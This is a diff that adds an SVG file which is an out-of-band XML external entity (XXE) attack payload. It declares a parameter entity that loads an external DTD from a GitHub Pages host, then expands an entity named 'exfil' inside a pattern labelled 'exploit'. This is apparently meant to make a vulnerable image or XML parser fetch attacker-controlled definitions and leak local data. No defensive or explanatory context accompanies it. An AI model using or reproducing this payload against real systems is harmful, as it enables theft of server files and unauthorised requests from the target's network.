@@ -1,0 +1,14 @@
+<!DOCTYPE svg [
+<!ENTITY % outside SYSTEM "https://panch0r3d.github.io/AZ_xxe2.dtd">
+%outside;
+]>
+<svg>
+<defs>
+<pattern id="exploit">
+  <text x="10" y="10">
+    &exfil;
+  </text>
+  <rect x="0" y="150" height="10" width="300" style="fill: black"/>
+</pattern>
+</defs>
+</svg>
